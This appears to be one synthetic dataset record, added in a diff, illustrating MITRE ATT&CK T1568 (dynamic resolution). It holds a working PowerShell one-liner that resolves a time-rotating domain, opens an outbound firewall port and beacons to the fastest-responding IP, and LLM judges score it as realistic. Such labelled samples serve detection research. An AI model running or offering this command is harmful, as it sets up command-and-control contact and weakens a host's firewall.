@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('api{0}.rollingdns.net' -f (Get-Date -Format 'HHmm')); $arec=Resolve-DnsName $dom -Type A -Server '1.1.1.1' -ErrorAction SilentlyContinue; if($arec){ netsh advfirewall firewall add rule name='out_65200' dir=out action=allow protocol=TCP remoteport=65200 | Out-Null; $best=$null; $min=999999; foreach($ip in ($arec | ForEach-Object IPAddress)){ $sw=[Diagnostics.Stopwatch]::StartNew(); $ok=(Test-NetConnection -ComputerName $ip -Port 65200 -InformationLevel Quiet); $sw.Stop(); if($ok -and $sw.ElapsedMilliseconds -lt $min){ $min=$sw.ElapsedMilliseconds; $best=$ip } }; if($best){ Invoke-WebRequest -Uri ('http://{0}:65200/sync' -f $best) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 5 } } }",
+  "explanation": "Resolves a DGA domain with multiple A records, times TCP connects to select the lowest-latency IP, opens port 65200, and then contacts the optimal endpoint.",
+  "rationale_steps": [
+    "Resolve the DGA domain to obtain a pool of IPs.",
+    "Benchmark TCP connection times to avoid unstable nodes.",
+    "Allow outbound traffic to an uncommon high port.",
+    "Connect to the selected IP while maintaining the original Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-ae93c803",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced delimiters, valid cmdlets/parameters, proper pipelines, and a correct hashtable literal.",
+        "semantic_score": 4,
+        "semantic_justification": "It performs dynamic resolution via time-based domain generation, resolves A records, selects the lowest-latency IP, and contacts it with the correct Host header, though the firewall rule addition likely requires elevation and may fail.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:56:42.979188Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced braces, parentheses, and quotes, proper semicolon separators, valid cmdlet syntax, and correct string formatting operators throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by constructing a time-based domain name (mimicking a DGA with HHmm rotation), resolving multiple A records via an external DNS server, selecting the lowest-latency endpoint via TCP timing, opening a firewall rule for port 65200, and beaconing to the optimal IP with a spoofed Host header — all operationally coherent and realistic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:31:30.286014Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced braces, parentheses, and valid PowerShell cmdlet parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly implements a time-based DGA and endpoint selection, though the netsh firewall modification requires administrative privileges which contradicts the 'None' privilege metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:31:32.753281Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
